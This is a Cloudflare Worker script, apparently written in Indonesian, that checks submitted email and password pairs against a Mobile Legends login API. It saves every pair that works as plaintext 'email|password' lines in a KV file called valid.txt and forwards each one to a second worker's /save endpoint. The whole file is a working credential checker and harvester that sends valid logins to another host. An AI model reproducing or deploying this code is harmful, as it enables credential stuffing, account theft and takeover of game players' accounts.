export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // CORS preflight
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
        },
      });
    }

    if (url.pathname === "/check" && request.method === "POST") {
      try {
        const { email, password, captcha_token } = await request.json();
        if (!email || !password || !captcha_token) {
          return Response.json({ error: "Missing parameters" }, { status: 400 });
        }

        // Simulasi request ke API MLBB (ganti dengan API asli)
        const mlbbRes = await fetch("https://accountmtapi.mobilelegends.com/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email,
            password,
            captcha: captcha_token,
          }),
        });

        const data = await mlbbRes.json();

        // Jika akun valid
        if (data.code === 0) {
          const line = `${email}|${password}\n`;

          // 1. Simpan ke KV sementara
          if (env.VALID_ACCOUNTS) {
            let old = await env.VALID_ACCOUNTS.get("valid.txt") || "";
            old += line;
            await env.VALID_ACCOUNTS.put("valid.txt", old);
          }

          // 2. Kirim ke Worker B
          if (env.WORKER_B_URL && env.SECRET_KEY) {
            try {
              await fetch(env.WORKER_B_URL + "/save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  secret: env.SECRET_KEY,
                  account: `${email}|${password}`,
                }),
              });
            } catch (err) {
              console.error("Gagal kirim ke Worker B:", err);
            }
          }
        }

        return Response.json(data);

      } catch (err) {
        return Response.json({ error: err.message }, { status: 500 });
      }
    }

    return new Response("Worker A aktif", { status: 200 });
  },
};
